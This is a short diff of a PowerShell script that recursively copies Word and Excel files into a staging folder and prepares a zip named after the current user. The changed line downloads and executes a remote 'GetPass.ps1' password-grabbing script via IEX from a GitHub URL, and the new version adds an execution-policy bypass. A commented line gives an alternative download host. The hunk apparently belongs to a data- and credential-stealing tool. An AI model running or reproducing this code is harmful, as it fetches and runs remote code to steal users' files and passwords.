@@ -2762,7 +2762,7 @@ Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $co
 Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 
-IEX (New-Object Net.WebClient).DownloadString('https://github.com/begiilm/dy/raw/master/GetPass.ps1');
+powershell -ExecutionPolicy Bypass -NoLogo -NoProfile IEX (New-Object Net.WebClient).DownloadString('https://github.com/begiilm/dy/raw/master/GetPass.ps1');
 #(new-object System.Net.WebClient).DownloadFile('http://wpbkt.oss-cn-hangzhou.aliyuncs.com/GetPass.ps1','D:\GetPass.ps1');
 #D:\GetPass.ps1;
 $object2 = (Get-ChildItem env:\username).value + ' Report.zip'
